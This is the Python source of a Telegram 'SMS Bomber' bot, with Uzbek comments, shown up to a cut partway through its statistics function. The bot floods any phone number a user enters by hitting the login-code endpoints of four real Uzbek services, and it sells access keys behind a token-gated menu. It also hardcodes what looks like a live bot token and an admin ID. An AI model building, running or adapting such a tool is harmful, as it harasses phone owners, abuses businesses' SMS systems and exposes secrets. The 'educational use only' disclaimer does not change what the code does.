import requests
import time
import uuid
import logging
import random
import string
import sqlite3
import asyncio
import concurrent.futures
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from telegram.constants import ParseMode

# Logging sozlamalari
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = "8375431062:AAHi4MunzV1Wk9-nNpwJMk_HHwcA2qRymHk"
ADMIN_ID = 5726072177

# Conversation holatlari
(PHONE_NUMBER, ALCHIROQ_COUNT, FULL_SMS_PHONE, 
 KEY_GENERATE_COUNT, KEY_GENERATE_DAYS, BROADCAST_MESSAGE, 
 ENTER_KEY) = range(7)

# Thread pool for parallel SMS sending
executor = concurrent.futures.ThreadPoolExecutor(max_workers=3)

# -------------------- DATABASE FUNKSIYALARI --------------------

def init_database():
    """Ma'lumotlar bazasini yaratish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Foydalanuvchilar jadvali
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            joined_date TEXT,
            is_banned INTEGER DEFAULT 0,
            ban_reason TEXT,
            keys_used INTEGER DEFAULT 0,
            has_valid_key INTEGER DEFAULT 0,
            active_key TEXT,
            key_activated_date TEXT
        )
    ''')
    
    # Kalitlar jadvali - YANGI: active_status maydoni qo'shildi
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key TEXT PRIMARY KEY,
            user_id INTEGER,
            generated_by INTEGER,
            generated_date TEXT,
            expires_date TEXT,
            is_used INTEGER DEFAULT 0,
            used_date TEXT,
            max_uses INTEGER DEFAULT 1,
            uses_left INTEGER DEFAULT 1,
            is_active INTEGER DEFAULT 1,
            deactivated_by_admin INTEGER DEFAULT 0,
            deactivated_date TEXT,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Statistik ma'lumotlar jadvali
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            stat_date TEXT PRIMARY KEY,
            total_requests INTEGER DEFAULT 0,
            olcha_requests INTEGER DEFAULT 0,
            brandstore_requests INTEGER DEFAULT 0,
            beemarket_requests INTEGER DEFAULT 0,
            alchiroq_requests INTEGER DEFAULT 0
        )
    ''')
    
    # Sozlamalar jadvali
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    # Eski jadvalni yangilash
    try:
        cursor.execute('ALTER TABLE users ADD COLUMN has_valid_key INTEGER DEFAULT 0')
    except:
        pass
    try:
        cursor.execute('ALTER TABLE users ADD COLUMN active_key TEXT')
    except:
        pass
    try:
        cursor.execute('ALTER TABLE users ADD COLUMN key_activated_date TEXT')
    except:
        pass
    try:
        cursor.execute('ALTER TABLE keys ADD COLUMN is_active INTEGER DEFAULT 1')
    except:
        pass
    try:
        cursor.execute('ALTER TABLE keys ADD COLUMN deactivated_by_admin INTEGER DEFAULT 0')
    except:
        pass
    try:
        cursor.execute('ALTER TABLE keys ADD COLUMN deactivated_date TEXT')
    except:
        pass
    
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    """Yangi foydalanuvchi qo'shish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
    exists = cursor.fetchone()
    
    if not exists:
        cursor.execute('''
            INSERT INTO users (user_id, username, first_name, last_name, joined_date, has_valid_key)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, last_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 0))
    else:
        cursor.execute('''
            UPDATE users SET username = ?, first_name = ?, last_name = ?
            WHERE user_id = ?
        ''', (username, first_name, last_name, user_id))
    
    conn.commit()
    conn.close()

def update_user_key_status(user_id):
    """Foydalanuvchining kalit statusini yangilash"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    now = datetime.now()
    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
    
    # Faol kalitlarni tekshirish (is_active=1 va muddati o'tmagan)
    cursor.execute('''
        SELECT key FROM keys 
        WHERE user_id = ? AND is_active = 1 AND is_used = 1
        AND expires_date > ?
        ORDER BY expires_date ASC LIMIT 1
    ''', (user_id, now_str))
    
    result = cursor.fetchone()
    
    if result:
        key = result[0]
        has_valid_key = 1
        active_key = key
    else:
        has_valid_key = 0
        active_key = None
    
    cursor.execute('''
        UPDATE users SET has_valid_key = ?, active_key = ? 
        WHERE user_id = ?
    ''', (has_valid_key, active_key, user_id))
    
    conn.commit()
    conn.close()
    return has_valid_key, active_key

def is_user_banned(user_id):
    """Foydalanuvchi ban qilinganmi tekshirish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT is_banned FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    conn.close()
    return result[0] == 1 if result else False

def ban_user(user_id, reason=""):
    """Foydalanuvchini ban qilish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?
    ''', (reason, user_id))
    
    conn.commit()
    conn.close()

def unban_user(user_id):
    """Foydalanuvchini bandan chiqarish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?', (user_id,))
    
    conn.commit()
    conn.close()

def generate_key(admin_id, count=1, days_valid=30):
    """YANGI: Kalit yaratish - endi bir marta ishlatiladi va admin faolsizlantirmaguncha ishlaydi"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    keys = []
    generated_date = datetime.now()
    expires_date = generated_date + timedelta(days=days_valid)
    
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        key = f"KXB-UZ-{random_part}"
        
        cursor.execute('''
            INSERT INTO keys (key, generated_by, generated_date, expires_date, max_uses, uses_left, is_active)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (key, admin_id, generated_date.strftime("%Y-%m-%d %H:%M:%S"), 
              expires_date.strftime("%Y-%m-%d %H:%M:%S"), 999999, 999999, 1))
        
        keys.append(key)
    
    conn.commit()
    conn.close()
    return keys

def activate_key(key, user_id):
    """YANGI: Kalitni aktivlashtirish - bir marta ishlatiladi va abadiy ishlaydi"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    now = datetime.now()
    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
    
    # Kalitni tekshirish
    cursor.execute('''
        SELECT key, expires_date, is_active, deactivated_by_admin FROM keys 
        WHERE key = ? AND is_used = 0
    ''', (key,))
    
    result = cursor.fetchone()
    
    if not result:
        conn.close()
        return False, "❌ Noto'g'ri kalit!"
    
    key_value, expires_date, is_active, deactivated_by_admin = result
    
    # Admin faolsizlantirganmi?
    if deactivated_by_admin == 1:
        conn.close()
        return False, "❌ Bu kalit admin tomonidan bloklangan!"
    
    # Muddati tekshirish
    try:
        expires = datetime.strptime(expires_date, "%Y-%m-%d %H:%M:%S")
        if now > expires:
            conn.close()
            return False, "❌ Kalit muddati tugagan!"
    except:
        conn.close()
        return False, "❌ Kalit formati xato!"
    
    # Kalitni aktivlashtirish (bir marta)
    cursor.execute('''
        UPDATE keys SET user_id = ?, is_used = 1, used_date = ?
        WHERE key = ?
    ''', (user_id, now_str, key))
    
    cursor.execute('UPDATE users SET keys_used = keys_used + 1 WHERE user_id = ?', (user_id,))
    
    # Foydalanuvchining active_keyini yangilash
    cursor.execute('''
        UPDATE users SET active_key = ?, key_activated_date = ?, has_valid_key = 1
        WHERE user_id = ?
    ''', (key, now_str, user_id))
    
    conn.commit()
    conn.close()
    
    return True, f"✅ Kalit muvaffaqiyatli aktivlashtirildi! Endi cheksiz foydalanishingiz mumkin."

def deactivate_key_by_admin(key, admin_id):
    """YANGI: Admin tomonidan kalitni faolsizlantirish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Kalitni topish
    cursor.execute('SELECT user_id FROM keys WHERE key = ?', (key,))
    result = cursor.fetchone()
    
    if not result:
        conn.close()
        return False, "❌ Kalit topilmadi!"
    
    user_id = result[0]
    
    # Kalitni faolsizlantirish
    cursor.execute('''
        UPDATE keys SET is_active = 0, deactivated_by_admin = 1, deactivated_date = ?
        WHERE key = ?
    ''', (now_str, key))
    
    # Foydalanuvchining statusini yangilash (agar shu kalit active bo'lsa)
    cursor.execute('''
        UPDATE users SET has_valid_key = 0, active_key = NULL
        WHERE user_id = ? AND active_key = ?
    ''', (user_id, key))
    
    conn.commit()
    conn.close()
    
    return True, f"✅ {key} kaliti faolsizlantirildi!"

def get_user_by_key(key):
    """YANGI: Kalit orqali foydalanuvchini topish"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT user_id FROM keys WHERE key = ?', (key,))
    result = cursor.fetchone()
    
    conn.close()
    return result[0] if result else None

def get_all_users():
    """Barcha foydalanuvchilar ro'yxati"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, username, first_name, last_name, joined_date, 
               is_banned, keys_used, has_valid_key, active_key, key_activated_date
        FROM users ORDER BY joined_date DESC
    ''')
    
    users = cursor.fetchall()
    conn.close()
    return users

def get_all_keys():
    """Barcha kalitlar ro'yxati"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT key, user_id, generated_by, generated_date, expires_date, 
               is_used, uses_left, max_uses, is_active, deactivated_by_admin
        FROM keys ORDER BY generated_date DESC
    ''')
    
    keys = cursor.fetchall()
    conn.close()
    return keys

def update_stats(service_name, count=1):
    """Statistikani yangilash"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    today = datetime.now().strftime("%Y-%m-%d")
    
    cursor.execute('''
        INSERT OR IGNORE INTO stats (stat_date, total_requests) VALUES (?, 0)
    ''', (today,))
    
    cursor.execute('UPDATE stats SET total_requests = total_requests + ? WHERE stat_date = ?', (count, today))
    cursor.execute(f'UPDATE stats SET {service_name}_requests = {service_name}_requests + ? WHERE stat_date = ?', (count, today))
    
    conn.commit()
    conn.close()

def check_user_key_valid(user_id):
    """Foydalanuvchining faol kaliti borligini tekshirish"""
    if user_id == ADMIN_ID:
        return True, None
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT active_key FROM users 
        WHERE user_id = ? AND has_valid_key = 1
    ''', (user_id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return True, result[0]
    return False, None

def user_has_valid_key(user_id):
    """Foydalanuvchining faol kaliti borligini qaytaradi"""
    if user_id == ADMIN_ID:
        return True
    
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT has_valid_key FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    conn.close()
    return result[0] == 1 if result else False

# -------------------- XIZMATLAR KLASSLARI --------------------

class OlchaSMSService:
    def __init__(self):
        self.url = "https://auth.olcha.uz/api/v1/sendsms2"
        self.headers = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "uz",
            "Content-Type": "application/json",
            "Origin": "https://olcha.uz",
            "Referer": "https://olcha.uz/",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Client-Model": "web"
        }
        self.session = requests.Session()

    def trigger_otp(self, phone_number):
        try:
            if phone_number.startswith('+'):
                phone_number = phone_number[1:]
            
            payload = {"phone": phone_number}
            
            response = self.session.post(
                self.url, 
                json=payload, 
                headers=self.headers, 
                timeout=10
            )
            
            if response.status_code == 200:
                return "✅"
            elif response.status_code == 429:
                return "🚫"
            elif response.status_code == 400:
                return "⚠️"
            else:
                return f"❌{response.status_code}"
        except Exception as e:
            return "❌"

class BrandStoreService:
    def __init__(self):
        self.url = "https://api.brandstore.uz/api/auth/code/create/"
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "uz,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://brandstore.uz",
            "Referer": "https://brandstore.uz/",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.session = requests.Session()

    def trigger_otp(self, phone_number):
        try:
            if phone_number.startswith('+'):
                phone_number = phone_number[1:]
            
            payload = {"phone": phone_number}
            
            response = self.session.post(
                self.url, 
                json=payload, 
                headers=self.headers, 
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                return "✅"
            elif response.status_code == 429:
                return "🚫"
            else:
                return f"❌{response.status_code}"
        except Exception as e:
            return "❌"

class BeeMarketService:
    def __init__(self):
        self.url = "https://market.beeline.uz/api/web/auth/login"
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "uz,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://market.beeline.uz",
            "Referer": "https://market.beeline.uz/",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.session = requests.Session()

    def trigger_otp(self, phone_number):
        try:
            if phone_number.startswith('+'):
                phone_number = phone_number[1:]
            
            payload = {"phone": phone_number}
            
            response = self.session.post(
                self.url, 
                json=payload, 
                headers=self.headers, 
                timeout=10
            )
            
            if response.status_code in [200, 201, 204]:
                return "✅"
            elif response.status_code == 429:
                return "🚫"
            else:
                return f"❌{response.status_code}"
        except Exception as e:
            return "❌"

class AlChiroqService:
    def __init__(self):
        self.url = "https://aladdin.1it.uz/gtw/v2/auth/sendVerifyCode"
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "ru",
            "Authorization": "Bearer null",
            "Content-Type": "application/json",
            "Origin": "https://app.alchiroq.uz",
            "Referer": "https://app.alchiroq.uz/",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        }
        self.session = requests.Session()

    def trigger_otp(self, phone_number):
        try:
            if phone_number.startswith('+'):
                phone_number = phone_number[1:]
            
            phone_int = int(phone_number)
            
            payload = {
                "phone": phone_int,
                "device_id": str(uuid.uuid4()),
                "app_instance_id": str(uuid.uuid4()),
                "client_type": "web"
            }
            
            response = self.session.post(
                self.url, 
                json=payload, 
                headers=self.headers, 
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                return "✅"
            elif response.status_code == 429:
                return "🚫"
            else:
                return f"❌{response.status_code}"
        except Exception as e:
            return "❌"

# -------------------- BOT FUNKSIYALARI --------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start komandasi"""
    user = update.effective_user
    add_user(user.id, user.username, user.first_name, user.last_name)
    
    if is_user_banned(user.id):
        await update.message.reply_text("🚫 Siz botdan chetlatilgansiz! Admin: @kxbuz")
        return
    
    # Foydalanuvchi statusini yangilash
    update_user_key_status(user.id)
    
    await show_main_menu_message(update, user)

async def show_main_menu_message(update, user):
    """Asosiy menyu"""
    has_valid_key = user_has_valid_key(user.id)
    
    if user.id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "👋 Xush kelibsiz, Admin! SMS Bomber v3"
    elif has_valid_key:
        # Faol kalitni olish
        _, active_key = check_user_key_valid(user.id)
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = f"👋 Xush kelibsiz!\n🔑 Faol kalit: {active_key}\n✅ Cheksiz foydalanishingiz mumkin!"
    else:
        keyboard = [
            [InlineKeyboardButton("🔑 Kalit kiritish", callback_data="enter_key")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "👋 Xush kelibsiz!\n\n❌ Faol kalit topilmadi!\nKalit kiriting yoki @kxbuz dan oling."
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tugmalar"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    
    if is_user_banned(user.id) and user.id != ADMIN_ID:
        await query.edit_message_text("🚫 Siz botdan chetlatilgansiz!")
        return
    
    data = query.data
    
    # Kalit kiritish
    if data == "enter_key":
        await query.edit_message_text(
            "🔑 Kalitni kiriting:\n\n"
            "Format: KXB-UZ-XXXXXXXX\n"
            "(KXB-UZ- dan keyin 8 ta HARF va RAQAM)\n\n"
            "Misol: KXB-UZ-ABC12345"
        )
        return ENTER_KEY
    
    # Kalitsiz foydalanuvchi tekshiruvi
    if user.id != ADMIN_ID and not user_has_valid_key(user.id) and data not in ["enter_key", "help", "back_to_main"]:
        keyboard = [[InlineKeyboardButton("🔑 Kalit kiritish", callback_data="enter_key")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "❌ Faol kalit yo'q!\nAvval kalit kiriting.",
            reply_markup=reply_markup
        )
        return
    
    if data == "sms_menu":
        keyboard = [
            [InlineKeyboardButton("🔵 AlChiroq", callback_data="alchiroq")],
            [InlineKeyboardButton("🟢 Olcha", callback_data="olcha")],
            [InlineKeyboardButton("🟠 BrandStore", callback_data="brandstore")],
            [InlineKeyboardButton("⚫ BeeMarket", callback_data="beemarket")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("📱 Xizmat tanlang:", reply_markup=reply_markup)
    
    elif data == "alchiroq":
        await query.edit_message_text(
            "📞 AlChiroq raqami:\n\n"
            "Format: 998901234567\n"
            "1-100 martagacha yuborish mumkin"
        )
        context.user_data['service'] = 'alchiroq'
        return PHONE_NUMBER
    
    elif data in ["olcha", "brandstore", "beemarket"]:
        names = {'olcha': 'Olcha', 'brandstore': 'BrandStore', 'beemarket': 'BeeMarket'}
        await query.edit_message_text(f"📞 {names[data]} raqami:\n\nFormat: 998901234567")
        context.user_data['service'] = data
        return PHONE_NUMBER
    
    elif data == "full_sms":
        await query.edit_message_text(
            "📞 Full SMS raqami:\n\n"
            "Format: 998901234567\n"
            "Barcha 4 xizmat birdan ishlaydi"
        )
        return FULL_SMS_PHONE
    
    elif data == "help":
        help_text = (
            "<b>YORDAM 📱 SMS BOT INSTRUKSIYASI</b>\n\n"
            "<b>1️🤖 BOTNI ISHGA TUSHIRISH</b>\n"
            "•Botga /start buyrug'ini yuboring\n"
            "•Sizga asosiy menyu ko'rsatiladi\n\n"
            "<b>2️🔐 KALIT TIZIMI</b>\n"
            "🔑 Kalit olish:\n"
            "•Kalitlarni @kxbuz dan sotib olishingiz mumkin\n•Kalit formati: KXB-UZ-XXXXXXXX (8 ta harf va raqam)\n•Misol: KXB-UZ-ABC12345\n\n"
            "<b>✅ Kalitni aktivlashtirish:</b>\n1) 'Kalit kiritish' tugmasini bosing\n2) Kalitni kiriting (masalan: KXB-UZ-ABC12345)\n3) Kalit bir marta aktivlashadi va belgilangan muddat ishlaydi\n4) Faollashtirilgandan so'ng barcha xizmatlar ochiladi\n\n"
            "<b>⚠️ Muhim:</b>\n•Kalit faqat BIR MARTA aktivlashtiriladi\n•Aktiv bo'lgandan keyin CHEKSIZ SMS yuborish mumkin\n•Admin kalitni bloklamasa, doimiy ishlaydi\n•Kalit muddati tugasa, yangisi kerak bo'ladi\n\n"
            "<b>⚠️ MUHIM OGOHLANTIRISH!</b>\n\n"
            "<b>BOTDAN FOYDALANISH QOIDALARI</b>\n"
            "Ushbu bot faqat ta’limiy va kiberxavfsizlik bo‘yicha xabardorlikni oshirish maqsadida yaratilgan.\nBotdan noqonuniy foydalanish, ruxsatsiz kirish, shaxsiy ma’lumotlarga tajovuz qilish yoki amaldagi qonunlarni buzish qat’iyan taqiqlanadi.\nBot yaratuvchisi foydalanuvchilar tomonidan amalga oshirilgan har qanday noqonuniy harakatlar uchun javobgar emas.\nBotdan foydalanish har kimning ixtiyori\n\n"
            "<b>👨‍💻 Admin:</b> @kxbuz"
        )
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode="HTML")
    
    elif data == "back_to_main":
        await show_main_menu(query, user)
    
    elif data == "admin_panel" and user.id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("👥 Foydalanuvchilar", callback_data="admin_users")],
            [InlineKeyboardButton("🔑 Kalitlar", callback_data="admin_keys")],
            [InlineKeyboardButton("✨ Kalit yaratish", callback_data="admin_generate_key")],
            [InlineKeyboardButton("📊 Statistika", callback_data="admin_stats")],
            [InlineKeyboardButton("📢 Xabar yuborish", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("👑 ADMIN PANELI", reply_markup=reply_markup)
    
    elif data == "admin_generate_key" and user.id == ADMIN_ID:
        await query.edit_message_text("🔑 Nechta kalit? (1-100):")
        return KEY_GENERATE_COUNT
    
    elif data == "admin_broadcast" and user.id == ADMIN_ID:
        await query.edit_message_text("📢 Xabar matnini kiriting:")
        return BROADCAST_MESSAGE
    
    elif data == "admin_stats" and user.id == ADMIN_ID:
        await show_stats(query)
    
    elif data == "admin_users" and user.id == ADMIN_ID:
        await show_users_list(query)
    
    elif data == "admin_keys" and user.id == ADMIN_ID:
        await show_keys_list(query)
    
    elif data.startswith("deactivate_") and user.id == ADMIN_ID:
        key = data.replace("deactivate_", "")
        success, message = deactivate_key_by_admin(key, user.id)
        await query.edit_message_text(message)
        await show_keys_list(query)
    
    elif data.startswith("ban_") and user.id == ADMIN_ID:
        target = int(data.split("_")[1])
        ban_user(target, "Admin ban")
        await query.edit_message_text(f"✅ {target} ban qilindi")
        await show_users_list(query)
    
    elif data.startswith("unban_") and user.id == ADMIN_ID:
        target = int(data.split("_")[1])
        unban_user(target)
        await query.edit_message_text(f"✅ {target} bandan chiqarildi")
        await show_users_list(query)

async def show_main_menu(query, user):
    """Asosiy menyu"""
    # Statusni yangilash
    update_user_key_status(user.id)
    has_valid_key = user_has_valid_key(user.id)
    
    if user.id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "👑 Admin menyu"
    elif has_valid_key:
        _, active_key = check_user_key_valid(user.id)
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = f"👋 Asosiy menyu\n🔑 Faol kalit: {active_key}\n✅ Cheksiz foydalanish"
    else:
        keyboard = [
            [InlineKeyboardButton("🔑 Kalit kiritish", callback_data="enter_key")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "👋 Asosiy menyu\n❌ Faol kalit yo'q"
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_users_list(query):
    """Foydalanuvchilar"""
    users = get_all_users()
    
    if not users:
        await query.edit_message_text("📭 Foydalanuvchilar yo'q")
        return
    
    text = "👥 FOYDALANUVCHILAR (oxirgi 10):\n\n"
    keyboard = []
    
    for i, u in enumerate(users[:10]):
        user_id, username, first_name, last_name, joined, banned, used, has_key, active_key, activated_date = u
        status = "🚫" if banned else "✅"
        key_status = "🔑" if has_key else "❌"
        name = first_name or username or f"User{user_id}"
        
        text += f"{i+1}. {status}{key_status} {name}\n"
        text += f"   ID: {user_id}\n"
        text += f"   @{username if username else '-'}\n"
        
        if has_key and active_key:
            text += f"   Kalit: {active_key}\n"
            if activated_date:
                text += f"   Aktiv: {activated_date[:16]}\n"
        else:
            text += f"   Kalit: yo'q\n"
        
        text += f"   So'rovlar: {used}\n\n"
        
        if banned:
            keyboard.append([InlineKeyboardButton(f"✅ Bandan chiqarish {user_id}", callback_data=f"unban_{user_id}")])
        else:
            keyboard.append([InlineKeyboardButton(f"🚫 Ban qilish {user_id}", callback_data=f"ban_{user_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_keys_list(query):
    """Kalitlar - YANGI: faolsizlantirish tugmasi qo'shildi"""
    keys = get_all_keys()
    
    if not keys:
        await query.edit_message_text("📭 Kalitlar yo'q")
        return
    
    text = "🔑 KALITLAR (oxirgi 10):\n\n"
    keyboard = []
    
    for i, k in enumerate(keys[:10]):
        key, user_id, gen_by, gen_date, exp_date, used, left, max_u, is_active, deactivated = k
        
        # Status
        if deactivated == 1:
            status = "🔴 BLOK"
        elif is_active == 1 and used == 1:
            status = "✅ AKTIV"
        elif used == 0:
            status = "🟡 KUTMOQDA"
        else:
            status = "⚪ NOFAOL"
        
        # Muddati tekshirish
        try:
            expires = datetime.strptime(exp_date, "%Y-%m-%d %H:%M:%S")
            now = datetime.now()
            if expires < now:
                status = "⌛ MUDDATI O'TGAN"
        except:
            pass
        
        text += f"{i+1}. {status}\n"
        text += f"   Kalit: {key}\n"
        
        if user_id:
            text += f"   Foyd.: {user_id}\n"
        else:
            text += f"   Foyd.: ishlatilmagan\n"
        
        text += f"   Yaratilgan: {gen_date[:16]}\n"
        text += f"   Muddati: {exp_date[:16]}\n\n"
        
        # Faolsizlantirish tugmasi (faqat aktiv kalitlar uchun)
        if is_active == 1 and used == 1 and deactivated == 0:
            keyboard.append([InlineKeyboardButton(f"🔴 Faolsizlantirish {key}", callback_data=f"deactivate_{key}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_stats(query):
    """Statistika"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Umumiy
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM keys')
    total_keys = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM keys WHERE is_used = 1 AND is_active = 1')
    active_keys = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM users WHERE has_valid_key = 1')
    users_with_keys = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM keys WHERE deactivated_by_admin = 1')
    deactivated_keys = cursor.fetchone()[0]
    
    # Bugun
    today = datetime.now().strftime("%Y-%m-%d")
    cursor.execute('SELECT * FROM stats WHERE stat_date = ?', (today,))
    today_stats = cursor.fetchone()
    
    # Oxirgi 7 kun
    week_ago = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
    cursor.execute('''
        SELECT SUM(total_requests), SUM(olcha_requests), SUM(brandstore_requests),
               SUM(beemarket_requests), SUM(alchiroq_requests)
        FROM stats WHERE stat_date >= ?
    ''', (week_ago,))
    week_stats = cursor.fetchone()
    
    conn.close()
    
    text = "📊 STATISTIKA\n\n"
    text += f"👥 Foydalanuvchilar: {total_users}\n"
    text += f"🔑 Kalitlilar: {users_with_keys}\n"
    text += f"🔐 Kalitlar: {total_keys}\n"
    text += f"✅ Aktiv kalitlar: {active_keys}\n"
    text += f"🔴 Bloklangan: {deactivated_keys}\n\n"
    
    text += "📈 BUGUN:\n"
    if today_stats:
        text += f"Jami: {today_stats[1]}\n"
        text += f"Olcha: {today_stats[2]}\n"
        text += f"BrandStore: {today_stats[3]}\n"
        text += f"BeeMarket: {today_stats[4]}\n"
        text += f"AlChiroq: {today_stats[5]}\n"
    else:
        text += "Ma'lumot yo'q\n"
    
    text += "\n📊 7 KUNDA:\n"
    if week_stats and week_stats[0]:
        text += f"Jami: {week_stats[0]}\n"
        text += f"Olcha: {week_stats[1]}\n"
        text += f"BrandStore: {week_stats[2]}\n"
